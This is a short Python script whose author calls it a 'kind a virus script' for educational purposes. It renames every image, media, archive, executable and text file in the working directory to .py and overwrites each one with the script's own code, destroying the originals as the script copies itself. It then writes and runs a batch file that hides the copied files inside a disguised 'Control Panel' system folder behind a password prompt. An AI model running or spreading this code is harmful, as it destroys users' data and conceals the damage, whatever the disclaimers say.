"""


READ ME FIRST- Warning you can damage your computer without having some knowleadge about the script
it will not be my responsiblity if you do... it is kind a virus script!!!!!

please watch my video to know how it works properly-
https://www.youtube.com/watch?v=mA-276bTChc



"""












## This program is just for eductaional purpose
## by using it please do not create troubles for other... and i'm not responsible if u done anything wrong!

# This Project Is Developed By Shailendra Singh Admin Of @Python_Coderz_ Page - Instagram
# Dm Us If You Have Any Query main page- https://www.instagram.com/python_Coderz_/
## My FB- http://www.facebook.com/shailendrakr007
## My Insta - http://www.instagram.com/shailendra_kr_007


import glob, os #pip install glob
import shutil #pip install shutil
import time
import sys

myfilename=__file__
extension=['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']

for i in extension:
    for file in glob.glob("*{}".format(i)):
        print(file)
        print (os.path.splitext(file)[0]+'.py')
        new_name=(os.path.splitext(file)[0]+'.py')
        
        os.rename(file,new_name)
        

        try:
            os.mkdir('backup')
            shutil.copy(os.path.splitext(file)[0]+'.py', 'backup')
        except:
            shutil.copy(os.path.splitext(file)[0]+'.py', 'backup')

        
        with open(myfilename) as f_old, open(new_name, "w") as f_new:
            for line in f_old:
                f_new.write(line)


with open('./locker.bat','w') as f:
    f.write("""cls
@ECHO OFF
title Folder backup
if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK

if EXIST backup (goto LOCK)
:LOCK
ren backup "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
echo Folder locked
goto End

:UNLOCK
echo Enter password to unlock folder
set/p "pass=>"
if NOT %pass%== password goto FAIL
attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" backup
echo Folder Unlocked successfully
goto End
:FAIL
echo Invalid password
goto end
:End """)

time.sleep(1)
os.system("locker.bat")



# For this tutorial i didn't harm anyone i used it in my own device during explanation...
# so please don't use it for any kind of illegal or malicious activities...
# This program is just for educational purpose 
# i'm not responsible for any action that may occur afterwards.